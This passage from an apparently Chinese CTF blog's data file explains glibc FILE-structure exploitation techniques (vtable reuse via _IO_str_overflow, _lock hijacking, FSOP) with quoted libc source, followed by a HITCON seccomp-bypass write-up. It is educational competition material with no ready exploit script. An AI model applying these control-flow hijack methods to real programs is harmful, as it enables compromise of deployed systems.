class=\"line\">  <span class=\"keyword\">void</span> *(*dlsym) (<span class=\"keyword\">void</span> *<span class=\"built_in\">map</span>, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *name);</div><div class=\"line\">  <span class=\"keyword\">int</span> (*dlclose) (<span class=\"keyword\">void</span> *<span class=\"built_in\">map</span>);</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<h4 id=\"exp-0x00\"><a href=\"#exp-0x00\" class=\"headerlink\" title=\"exp 0x00\"></a>exp 0x00</h4><p>档不能伪造vtable的时候，发现可以直接使用原先_vtable_jmp的函数``JUMP_INIT(overflow, _IO_str_overflow)</p>\n<figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\">const struct _IO_jump_t _IO_str_jumps libio_vtable =</div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT_DUMMY,</span></div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(finish, </span>_IO_str_finish),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(overflow, </span>_IO_str_overflow),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(underflow, </span>_IO_str_underflow),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(uflow, </span>_IO_default_uflow),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(pbackfail, </span>_IO_str_pbackfail),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(xsputn, </span>_IO_default_xsputn),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(xsgetn, </span>_IO_default_xsgetn),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(seekoff, </span>_IO_str_seekoff),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(seekpos, </span>_IO_default_seekpos),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(setbuf, </span>_IO_default_setbuf),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(sync, </span>_IO_default_sync),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(doallocate, </span>_IO_default_doallocate),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(read, </span>_IO_default_read),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(write, </span>_IO_default_write),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(seek, </span>_IO_default_seek),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(close, </span>_IO_default_close),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(stat, </span>_IO_default_stat),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(showmanyc, </span>_IO_default_showmanyc),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(imbue, </span>_IO_default_imbue)</div><div class=\"line\">&#125;<span class=\"comment\">;</span></div></pre></td></tr></table></figure>\n<p>这个<code>_IO_str_overflow</code>的源码中有<code>new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</code>这样一句，由于我们是可以控制<code>fp</code>的，所以我们伪造<code>fp-&gt;_s._allocate_buffer</code>这个偏移的函数即可控制一次rip。</p>\n<figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div></pre></td><td class=\"code\"><pre><div class=\"line\">int</div><div class=\"line\">_IO_str_overflow (_IO_FILE *fp, int c)</div><div class=\"line\">&#123;</div><div class=\"line\">  int flush_only = c == EOF;</div><div class=\"line\">  _IO_size_t pos;</div><div class=\"line\">  <span class=\"function\"><span class=\"title\">if</span> (fp-&gt;</span>_flags &amp; _IO_NO_WRITES)</div><div class=\"line\">      return flush_only ? <span class=\"number\">0</span> : EOF;</div><div class=\"line\">  <span class=\"function\"><span class=\"title\">if</span> ((fp-&gt;</span>_<span class=\"function\"><span class=\"title\">flags</span> &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;</span>_flags &amp; _IO_CURRENTLY_PUTTING))</div><div class=\"line\">    &#123;</div><div class=\"line\">      <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_flags |= _IO_CURRENTLY_PUTTING;</div><div class=\"line\">      <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">write_ptr</span> = fp-&gt;</span>_IO_read_ptr;</div><div class=\"line\">      <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">read_ptr</span> = fp-&gt;</span>_IO_read_end;</div><div class=\"line\">    &#125;</div><div class=\"line\">  <span class=\"function\"><span class=\"title\">pos</span> = fp-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">write_ptr</span> - fp-&gt;</span>_IO_write_base;</div><div class=\"line\">  <span class=\"keyword\">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</div><div class=\"line\">    &#123;</div><div class=\"line\">      <span class=\"function\"><span class=\"title\">if</span> (fp-&gt;</span>_flags &amp; _IO_USER_BUF) <span class=\"comment\">/* not allowed to enlarge */</span></div><div class=\"line\">        return EOF;</div><div class=\"line\">      <span class=\"keyword\">else</span></div><div class=\"line\">        &#123;</div><div class=\"line\">          char *new_buf;</div><div class=\"line\">          <span class=\"function\"><span class=\"title\">char</span> *old_buf = fp-&gt;</span>_IO_buf_base;</div><div class=\"line\">          size_t old_blen = _IO_blen (fp);</div><div class=\"line\">          _IO_size_t new_size = <span class=\"number\">2</span> * old_blen + <span class=\"number\">100</span>;</div><div class=\"line\">          <span class=\"keyword\">if</span> (new_size &lt; old_blen)</div><div class=\"line\">            return EOF;</div><div class=\"line\">          new_buf</div><div class=\"line\">            = (<span class=\"function\"><span class=\"title\">char</span> *) (*((_IO_strfile *) fp)-&gt;</span>_s._allocate_buffer) (new_size);</div><div class=\"line\">          <span class=\"keyword\">if</span> (new_buf == NULL)</div><div class=\"line\">            &#123;</div><div class=\"line\">              <span class=\"comment\">/*          __ferror(fp) = 1; */</span></div><div class=\"line\">              return EOF;</div><div class=\"line\">            &#125;</div><div class=\"line\">          <span class=\"keyword\">if</span> (old_buf)</div><div class=\"line\">            &#123;</div><div class=\"line\">              memcpy (new_buf, old_buf, old_blen);</div><div class=\"line\">              (*((_IO_<span class=\"function\"><span class=\"title\">strfile</span> *) fp)-&gt;</span>_s._free_buffer) (old_buf);</div><div class=\"line\">              <span class=\"comment\">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></div><div class=\"line\">              <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_buf_base = NULL;</div><div class=\"line\">            &#125;</div><div class=\"line\">          memset (new_buf + old_blen, <span class=\"string\">'\\0'</span>, new_size - old_blen);</div><div class=\"line\"> </div><div class=\"line\">          _IO_setb (fp, new_buf, new_buf + new_size, <span class=\"number\">1</span>);</div><div class=\"line\">          <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">read_base</span> = new_buf + (fp-&gt;</span>_IO_read_base - old_buf);</div><div class=\"line\">          <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">read_ptr</span> = new_buf + (fp-&gt;</span>_IO_read_ptr - old_buf);</div><div class=\"line\">          <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">read_end</span> = new_buf + (fp-&gt;</span>_IO_read_end - old_buf);</div><div class=\"line\">          <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">write_ptr</span> = new_buf + (fp-&gt;</span>_IO_write_ptr - old_buf);</div><div class=\"line\"> </div><div class=\"line\">          <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_write_base = new_buf;</div><div class=\"line\">          <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">write_end</span> = fp-&gt;</span>_IO_buf_end;</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\"> </div><div class=\"line\">  <span class=\"keyword\">if</span> (!flush_only)</div><div class=\"line\">    *<span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_write_ptr++ = (unsigned char) c;</div><div class=\"line\">  <span class=\"function\"><span class=\"title\">if</span> (fp-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">write_ptr</span> &gt; fp-&gt;</span>_IO_read_end)</div><div class=\"line\">    <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">read_end</span> = fp-&gt;</span>_IO_write_ptr;</div><div class=\"line\">  return c;</div><div class=\"line\">&#125;</div><div class=\"line\">libc_hidden_def (_IO_str_overflow)</div></pre></td></tr></table></figure>\n<h4 id=\"exp-0x01\"><a href=\"#exp-0x01\" class=\"headerlink\" title=\"exp 0x01\"></a>exp 0x01</h4><p>再看下<code>dl_open_hook</code>这个指针，似乎是在有其他hook_so的时候使用的，在检查<code>_dl_open_hook</code>是否为空之后，会进行<code>_vtable_check</code>然后调用<code>dlopen_mode</code>这个函数指针处，这个结构体我们可以伪造，接着就得到一次控制rip的机会。</p>\n<h4 id=\"exp-0x02\"><a href=\"#exp-0x02\" class=\"headerlink\" title=\"exp 0x02\"></a>exp 0x02</h4><p>@angelboy下面提供了一种思路，通过<code>_fileno</code>和<code>_IO_buffer</code>来进行任意地址读写，原理也容易理解，当我们可以控制<code>_IO_buffer</code>的指针时，就可以适当的设置缓冲区地址到我们的目标地址即可。</p>\n<ul>\n<li>Arbitrary memory reading<ul>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/9.png\" alt=\"\"></li>\n</ul>\n</li>\n<li>Arbitrary memory writing<ul>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/8.png\" alt=\"\"></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"exp-0x03\"><a href=\"#exp-0x03\" class=\"headerlink\" title=\"exp 0x03\"></a>exp 0x03</h4><p>以及whctf那种利用unsortbins attack（main_arena）的（因为libc中stdin下面就是main_arena，可以一直覆盖到，只需要将<code>_IO_buf_end</code>改写到后面即可）</p>\n<h4 id=\"exp-0x04\"><a href=\"#exp-0x04\" class=\"headerlink\" title=\"exp 0x04\"></a>exp 0x04</h4><p>利用<code>_IO_lock_t *_lock</code>这个结构来控制rip。</p>\n<figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">typedef struct &#123; int lock; int cnt; void *owner; &#125; _IO_lock_t;</div><div class=\"line\">.....</div><div class=\"line\">.....</div><div class=\"line\">struct _IO_FILE &#123;</div><div class=\"line\">......</div><div class=\"line\">  _IO_lock_t *_lock;</div><div class=\"line\">.....</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<p>这个是2.24的版本，直接控制这个结构体的指针即可。<br>其调用的源码是</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">int</div><div class=\"line\"><span class=\"variable\">_IO_new_fclose</span> (<span class=\"variable\">_IO_FILE</span> *fp)</div><div class=\"line\">&#123;</div><div class=\"line\">...</div><div class=\"line\">  <span class=\"variable\">_IO_acquire_lock</span> (fp);</div><div class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;<span class=\"variable\">_IO_file_flags</span> &amp; <span class=\"variable\">_IO_IS_FILEBUF</span>)</div><div class=\"line\">    status = <span class=\"variable\">_IO_file_close_it</span> (fp);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>我们把这个<code>_lock</code>结构体指向一个可以控制的地方，rip就会跳到<code>call *(_lock+0x10)</code>，可以控制rip。</p>\n<h4 id=\"exp-0x05-FSOP\"><a href=\"#exp-0x05-FSOP\" class=\"headerlink\" title=\"exp 0x05 FSOP\"></a>exp 0x05 FSOP</h4><p>FSOP</p>\n<p>这个主要就是利用<code>chain</code>这个字段，档我们调用</p>\n<ul>\n<li>Glibc abort routine</li>\n<li>exit</li>\n<li>main return</li>\n</ul>\n<p>时，<code>_IO_flush_all_lockp</code>就会被调用，然后fflush all stream</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div></pre></td><td class=\"code\"><pre><div class=\"line\">int</div><div class=\"line\"><span class=\"variable\">_IO_flush_all_lockp</span> (int do_lock)</div><div class=\"line\">&#123;</div><div class=\"line\">  int result = <span class=\"number\">0</span>;</div><div class=\"line\">  struct <span class=\"variable\">_IO_FILE</span> *fp;</div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> _IO_MTSAFE_IO</span></div><div class=\"line\">  <span class=\"variable\">_IO_cleanup_region_start_noarg</span> (flush_cleanup);</div><div class=\"line\">  <span class=\"variable\">_IO_lock_lock</span> (list_all_lock);</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"> </div><div class=\"line\">  <span class=\"keyword\">for</span> (fp = (<span class=\"variable\">_IO_FILE</span> *) <span class=\"variable\">_IO_list_all</span>; fp != NULL; fp = fp-&gt;<span class=\"variable\">_chain</span>)</div><div class=\"line\">    &#123;</div><div class=\"line\">      run_fp = fp;</div><div class=\"line\">      <span class=\"keyword\">if</span> (do_lock)</div><div class=\"line\">        <span class=\"variable\">_IO_flockfile</span> (fp);</div><div class=\"line\"> </div><div class=\"line\">      <span class=\"keyword\">if</span> (((fp-&gt;<span class=\"variable\">_mode</span> &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;<span class=\"variable\">_IO_write_ptr</span> &gt; fp-&gt;<span class=\"variable\">_IO_write_base</span>)</div><div class=\"line\">           || (<span class=\"variable\">_IO_vtable_offset</span> (fp) == <span class=\"number\">0</span></div><div class=\"line\">               &amp;&amp; fp-&gt;<span class=\"variable\">_mode</span> &gt; <span class=\"number\">0</span> &amp;&amp; (fp-&gt;<span class=\"variable\">_wide_data</span>-&gt;<span class=\"variable\">_IO_write_ptr</span></div><div class=\"line\">                                    &gt; fp-&gt;<span class=\"variable\">_wide_data</span>-&gt;<span class=\"variable\">_IO_write_base</span>))</div><div class=\"line\">           )</div><div class=\"line\">          &amp;&amp; <span class=\"variable\">_IO_OVERFLOW</span> (fp, EOF) == EOF)     <span class=\"comment\">// Trigger virtual funcation</span></div><div class=\"line\">...</div><div class=\"line\"> </div><div class=\"line\">  return result;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>当我们修改<code>chain</code>的时候，将其控制到我们可写的一个地方，然后可以选择0x00的方法直接getshell，也可以选择两个或多个<code>FILE</code>结构体来完成rop（但是感觉好鸡肋，要没有_vtable_check，而且在可以控制一次rip的情况下可以跳到很多地方去）</p>\n<h2 id=\"level-3\"><a href=\"#level-3\" class=\"headerlink\" title=\"level 3\"></a>level 3</h2><h2 id=\"level-4\"><a href=\"#level-4\" class=\"headerlink\" title=\"level 4\"></a>level 4</h2><h2 id=\"level-5\"><a href=\"#level-5\" class=\"headerlink\" title=\"level 5\"></a>level 5</h2>"},{"title":"2017HITCON整理","date":"2017-11-15T10:48:35.000Z","_content":"\n## Start\n\nruby的pwntools写一下，其中有一些小坑。\n\n## 完美无瑕\n\n用[seccomp-tools](https://github.com/david942j/seccomp-tools)可以发现其中存在seccomp规则。详细的说名在这篇文章中可以看到[Eigenstate : Seccomp Sandboxing](https://eigenstate.org/notes/seccomp)\n\n```\nroot@kali ~/c/2/p/artifact# seccomp-tools dump ./artifact \n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018\n 0002: 0x20 0x00 0x00 0x00000020  A = args[2]\n 0003: 0x07 0x00 0x00 0x00000000  X = A\n 0004: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019\n 0006: 0x15 0x0c 0x00 0x00000001  if (A == write) goto 0019\n 0007: 0x15 0x0b 0x00 0x00000005  if (A == fstat) goto 0019\n 0008: 0x15 0x0a 0x00 0x00000008  if (A == lseek) goto 0019\n 0009: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0011\n 0010: 0x15 0x00 0x03 0x0000000a  if (A != mprotect) goto 0014\n 0011: 0x87 0x00 0x00 0x00000000  A = X\n 0012: 0x54 0x00 0x00 0x00000001  A &= 0x1\n 0013: 0x15 0x04 0x05 0x00000001  if (A == 1) goto 0018 else goto 0019\n 0014: 0x1d 0x04 0x00 0x0000000b  if (A == X) goto 0019\n 0015: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0019\n 0016: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0019\n 0017: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0019\n 0018: 0x06 0x00 0x00 0x00000000  return KILL\n 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n```\n\n可以看出允许了`read`，`write`，`fstat`这几个函数功能，如果第三个参数是奇数则`kill`，所以`mmap`和`mprotect`不能申请执行段。同时如果`arg[2]`和`syscallnum`相同则可以执行，所以`open`是可以的。最后用`ORW`得到flag即可。","source":"_posts/2017HITCON整理.md","raw":"---\ntitle: 2017HITCON整理\ntags:\n  - PWN\n  - writeup\ncategories: []\ndate: 2017-11-15 18:48:35\n---\n\n## Start\n\nruby的pwntools写一下，其中有一些小坑。\n\n## 完美无瑕\n\n用[seccomp-tools](https://github.com/david942j/seccomp-tools)可以发现其中存在seccomp规则。详细的说名在这篇文章中可以看到[Eigenstate : Seccomp Sandboxing](https://eigenstate.org/notes/seccomp)\n\n```\nroot@kali ~/c/2/p/artifact# seccomp-tools dump ./artifact \n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018\n 0002: 0x20 0x00 0x00 0x00000020  A = args[2]\n 0003: 0x07 0x00 0x00 0x00000000  X = A\n 0004: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019\n 0006: 0x15 0x0c 0x00 0x00000001  if (A == write) goto 0019\n 0007: 0x15 0x0b 0x00 0x00000005  if (A == fstat) goto 0019\n 0008: 0x15 0x0a 0x00 0x00000008  if (A == lseek) goto 0019\n 0009: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0011\n 0010: 0x15 0x00 0x03 0x0000000a  if (A != mprotect) goto 0014\n 0011: 0x87 0x00 0x00 0x00000000  A = X\n 0012: 0x54 0x00 0x00 0x00000001  A &= 0x1\n 0013: 0x15 0x04 0x05 0x00000001  if (A == 1) goto 0018 else goto 0019\n 0014: 0x1d 0x04 0x00 0x0000000b  if (A == X) goto 0019\n 0015: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0019\n 0016: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0019\n 0017: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0019\n 0018: 0x06 0x00 0x00 0x00000000  return KILL\n 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n```\n\n可以看出允许了`read`，`write`，`fstat`这几个函数功能，如果第三个参数是奇数则`kill`，所以`mmap`和`mprotect`不能申请执行段。同时如果`arg[2]`和`syscallnum`相同则可以执行，所以`open`是可以的。最后用`ORW`得到flag即可。","slug":"2017HITCON整理","published":1,"updated":"2017-12-04T14:43:40.878Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jxb0008hv18toz83w5o","content":"<h2 id=\"Start\"><a href=\"#Start\" class=\"headerlink\" title=\"Start\"></a>Start</h2><p>ruby的pwntools写一下，其中有一些小坑。</p>\n<h2 id=\"完美无瑕\"><a href=\"#完美无瑕\" class=\"headerlink\" title=\"完美无瑕\"></a>完美无瑕</h2><p>用<a href=\"https://github.com/david942j/seccomp-tools\" target=\"_blank\" rel=\"external\">seccomp-tools</a>可以发现其中存在seccomp规则。详细的说名在这篇文章中可以看到<a href=\"https://eigenstate.org/notes/seccomp\" target=\"_blank\" rel=\"external\">Eigenstate : Seccomp Sandboxing</a></p>\n<figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali ~/c/<span class=\"number\">2</span>/p/artifact# seccomp-tools dump ./artifact </div><div class=\"line\"> line  CODE  JT   JF      K</div><div class=\"line\">=================================</div><div class=\"line\"> <span class=\"number\">0000</span>: <span class=\"number\">0x20 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000004</span>  <span class=\"keyword\">A</span> = arch</div><div class=\"line\"> <span class=\"number\">0001</span>: <span class=\"number\">0x15 0x00</span> <span class=\"number\">0</span>x10 <span class=\"number\">0</span>xc000003e  if (<span class=\"keyword\">A</span> != ARCH_X86_64) goto <span class=\"number\">0018</span></div><div class=\"line\"> <span class=\"number\">0002</span>: <span class=\"number\">0x20 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000020</span>  <span class=\"keyword\">A</span> = args[<span class=\"number\">2</span>]</div><div class=\"line\"> <span class=\"number\">0003</span>: <span class=\"number\">0x07 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000000</span>  X = <span class=\"keyword\">A</span></div><div class=\"line\"> <span class=\"number\">0004</span>: <span class=\"number\">0x20 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000000</span>  <span class=\"keyword\">A</span> = sys_number</div><div class=\"line\"> <span class=\"number\">0005</span>: <span class=\"number\">0</span>x15 <span class=\"number\">0</span>x0d <span class=\"number\">0</span>x00 <span class=\"number\">0x00000000</span>  if (<span class=\"keyword\">A</span> == read) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0006</span>: <span class=\"number\">0</span>x15 <span class=\"number\">0</span>x0c <span class=\"number\">0</span>x00 <span class=\"number\">0x00000001</span>  if (<span class=\"keyword\">A</span> == write) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0007</span>: <span class=\"number\">0</span>x15 <span class=\"number\">0</span>x0b <span class=\"number\">0</span>x00 <span class=\"number\">0x00000005</span>  if (<span class=\"keyword\">A</span> == fstat) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0008</span>: <span class=\"number\">0</span>x15 <span class=\"number\">0</span>x0a <span class=\"number\">0</span>x00 <span class=\"number\">0x00000008</span>  if (<span class=\"keyword\">A</span> == lseek) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0009</span>: <span class=\"number\">0x15 0x01</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000009</span>  if (<span class=\"keyword\">A</span> == mmap) goto <span class=\"number\">0011</span></div><div class=\"line\"> <span class=\"number\">0010</span>: <span class=\"number\">0x15 0x00</span> <span class=\"number\">0</span>x03 <span class=\"number\">0</span>x0000000a  if (<span class=\"keyword\">A</span> != mprotect) goto <span class=\"number\">0014</span></div><div class=\"line\"> <span class=\"number\">0011</span>: <span class=\"number\">0x87 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000000</span>  <span class=\"keyword\">A</span> = X</div><div class=\"line\"> <span class=\"number\">0012</span>: <span class=\"number\">0x54 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000001</span>  <span class=\"keyword\">A</span> &amp;= <span class=\"number\">0</span>x1</div><div class=\"line\"> <span class=\"number\">0013</span>: <span class=\"number\">0x15 0x04</span> <span class=\"number\">0</span>x05 <span class=\"number\">0x00000001</span>  if (<span class=\"keyword\">A</span> == <span class=\"number\">1</span>) goto <span class=\"number\">0018</span> else goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0014</span>: <span class=\"number\">0</span>x1d <span class=\"number\">0x04 0x00</span> <span class=\"number\">0</span>x0000000b  if (<span class=\"keyword\">A</span> == X) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0015</span>: <span class=\"number\">0x15 0x03</span> <span class=\"number\">0</span>x00 <span class=\"number\">0</span>x0000000c  if (<span class=\"keyword\">A</span> == brk) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0016</span>: <span class=\"number\">0x15 0x02</span> <span class=\"number\">0</span>x00 <span class=\"number\">0</span>x0000003c  if (<span class=\"keyword\">A</span> == exit) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0017</span>: <span class=\"number\">0x15 0x01</span> <span class=\"number\">0</span>x00 <span class=\"number\">0</span>x<span class=\"number\">000000e7</span>  if (<span class=\"keyword\">A</span> == exit_group) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0018</span>: <span class=\"number\">0x06 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000000</span>  return KILL</div><div class=\"line\"> <span class=\"number\">0019</span>: <span class=\"number\">0x06 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0</span>x7fff0000  return ALLOW</div></pre></td></tr></table></figure>\n<p>可以看出允许了<code>read</code>，<code>write</code>，<code>fstat</code>这几个函数功能，如果第三个参数是奇数则<code>kill</code>，所以<code>mmap</code>和<code>mprotect</code>不能申请执行段。同时如果<code>arg[2]</code>和<code>syscallnum</code>相同则可以执行，所以<code>open</code>是可以的。最后用<code>ORW</code>得到flag即可。</p>\n","excerpt":"","more":"<h2 id=\"Start\"><a href=\"#Start\" class=\"headerlink\" title=\"Start\"></a>Start</h2><p>ruby的pwntools写一下，其中有一些小坑。</p>\n<h2 id=\"完美无瑕\"><a href=\"#完美无瑕\" class=\"headerlink\" title=\"完美无瑕\"></a>完美无瑕</h2><p>用<a href=\"https://github.com/david942j/seccomp-tools\">seccomp-tools</a>可以发现其中存在seccomp规则。详细的说名在这篇文章中可以看到<a href=\"https://eigenstate.org/notes/seccomp\">Eigenstate : Seccomp Sandboxing</a></p>\n<figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div 